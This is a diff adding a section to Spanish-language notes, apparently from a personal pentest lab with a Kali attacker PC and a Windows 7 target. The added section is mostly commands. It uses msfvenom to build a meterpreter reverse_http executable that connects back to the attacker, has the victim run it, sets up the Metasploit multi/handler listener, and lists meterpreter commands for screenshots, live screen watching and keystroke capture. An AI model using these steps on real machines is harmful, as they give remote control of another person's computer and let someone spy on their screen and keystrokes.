@@ -1,5 +1,5 @@
 ++ PC1: Kali
-++ PC2: Windows 7
+++ PC2: Windows 7 x86
 
 ++ PC2: Firewall de windows apagado
 --- Nota: Aún con el firewall activo el proceso puede llevarse a cabo,
@@ -23,6 +23,30 @@ de salida. Este es el caso del reverse shell: el equipo con windows se conecta a
 ----- arp -a (Permite ver los otros dispositivos que están en la red)
 ----- ipconfig (Nos permite ver la información de red del equipo)
 ----- netstat (Nos permite ver que programas tienen conexión a internet)
+
+++ Uso de msfvenom para captura de escritorio, audio, etc
+--- PC1: msfvenom -p windows/meterpreter/reverse_http lhost=<ip_PC1> lport=<443> -f exe > <nombre_programa>
+----- Nota: como podemos apreciar el comando es muy parecido al usado anteriormente, la principal diferencia es la presencia de /meterpreter (Esto es lo que permite hacer uso de comandos más sofisticados para tomar capturas de escritorio, audio, etc
+--- PC2: Ejecutar el programa generado
+--- PC1: msfconsole
+--- PC1: use exploit/multi/handler
+--- PC1: Enter
+--- PC1: set lhost <ip_PC1>
+--- PC1: set lport 443
+--- PC1: set payload windows/meterpreter/reverse_http
+--- PC1: exploit
+--- PC1: meterpreter> (Esto nos indica que podemos ejecutar comandos tales como:)
+---- help (Ver todos los comandos disponibles)
+---- screenshare (Ver lo que realiza el usuario en tiempo real)
+---- screenshot (Tomar una captura de la pantalla del usuario)
+---- keyscan_start (Iniciar la captura del teclado)
+---- keyscan_stop (Parar la captura del teclado)
+
+
+
+
+
+
 
 
 
